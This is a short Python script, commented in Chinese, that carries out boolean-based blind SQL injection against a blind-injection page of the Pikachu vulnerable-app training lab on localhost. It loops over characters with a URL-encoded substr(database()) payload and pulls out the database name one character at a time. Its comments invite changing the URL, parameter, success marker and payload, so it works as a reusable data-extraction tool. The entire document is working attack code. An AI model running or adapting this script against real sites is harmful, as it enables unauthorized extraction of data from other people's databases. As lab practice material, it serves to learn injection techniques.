import requests

url = 'http://localhost/pikachu-master/vul/sqli/sqli_blind_b.php'#修改url
success = 'your email is'#修改成功响应的内容
var="name"#修改变量

def database_name(n):
    name = ''
    for j in range(1,n+1):
        for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
            payload = f"?{var}=1%27+and+substr%28database%28%29%2C{j}%2C1%29%3D%27{i}%27%23"#修改payload
            r = requests.get(url + payload+"&submit=%E6%9F%A5%E8%AF%A2")#根据请求修改
            print(url + payload+"&submit=%E6%9F%A5%E8%AF%A2")
            if success in r.text:
                name = name + i
                print(name)
                break
    print('database_name:', name)

database_name(7)